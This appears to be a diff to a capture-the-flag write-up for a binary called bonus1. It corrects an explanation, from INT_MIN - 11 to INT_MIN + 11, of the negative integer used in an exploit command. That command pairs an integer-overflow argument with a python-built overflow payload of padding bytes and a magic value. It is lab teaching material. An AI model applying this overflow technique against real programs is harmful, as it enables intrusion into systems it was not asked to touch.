@@ -25,5 +25,5 @@ We can launch the program this way:
 ./bonus1 -2147483637 `python -c "print('?' * 40 + '464c4f57'.decode('hex'))"`
 ```
 
-We have chosen `-2147483637` as it is equal to `INT_MIN - 11`.
+We have chosen `-2147483637` as it is equal to `INT_MIN + 11`.
 Allowing us to complete this bonus.
